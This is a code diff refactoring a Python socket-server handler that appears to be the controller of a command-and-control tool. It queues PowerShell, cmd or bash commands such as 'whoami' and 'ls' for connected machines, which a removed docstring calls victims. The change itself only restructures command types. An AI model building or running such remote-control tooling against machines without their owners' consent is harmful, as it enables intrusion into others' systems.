@@ -1,21 +1,9 @@
 from socketserver import BaseRequestHandler
 import backend.handlers as handlers
-from enum import Enum
 from datetime import datetime, timedelta
+from frontend.util.structs import CommandType, Command
 
 
-class Commands(Enum):
-    """ The types of commands that can be on the victim
-
-    * NOP = Do nothing
-    * POWERSHELL = Run something in powershell
-    * CMD = Run Something in cmd
-
-    """
-    NOP = 0
-    PS = 1
-    CMD = 2
-    BASH = 3
 
 
 class ProvenanceClientHandler(BaseRequestHandler):
@@ -31,7 +19,7 @@ class ProvenanceClientHandler(BaseRequestHandler):
 
         # Subclass Initialization
         self.hostname = hostname or f"Client_{self.client_count}"
-        self.queued_commands = [(Commands.PS, "whoami", 1000), (Commands.PS, "ls", 1001)]
+        self.queued_commands = [Command(CommandType.PS, "whoami", 1000), Command(CommandType.PS, "ls", 1001)]
         self.sent_commands = []
         self.command_count = 0
         # The model that tracks each controlled machine
@@ -74,7 +62,7 @@ class ProvenanceClientHandler(BaseRequestHandler):
             #TODO Make a command tuple
             cmd_to_be_sent = self.queued_commands.pop()[:2]
         else:
-            cmd_to_be_sent = (Commands.NOP, "NONE")
+            cmd_to_be_sent = (CommandType.NOP, "NONE")
         self.protocol_handler.handle_request(self.request, port, cmd_to_be_sent)
         self.sent_commands.append((self.command_count, cmd_to_be_sent))
 
@@ -87,9 +75,9 @@ class ProvenanceClientHandler(BaseRequestHandler):
         :param cmd: the command to be sent
         :return: None
         """
-        convert = {"ps": Commands.PS, "bash":Commands.BASH, "cmd":Commands.CMD}
+        convert = {"ps": CommandType.PS, "bash":CommandType.BASH, "cmd":CommandType.CMD}
         command_type = convert[ctype]
-        self.queued_commands.append((command_type, cmd, self.command_count))
+        self.queued_commands.append(Command(command_type, cmd, self.command_count))
         self.command_count += 1
 
     def remove_command(self, cmd_id):
@@ -102,7 +90,7 @@ class ProvenanceClientHandler(BaseRequestHandler):
         :return: None
         """
         for i, cmd in enumerate(self.queued_commands):
-            if cmd[2] == cmd_id:
+            if cmd.uid == cmd_id:
                 self.queued_commands.pop(i)
 
     def get_queued_commands(self):
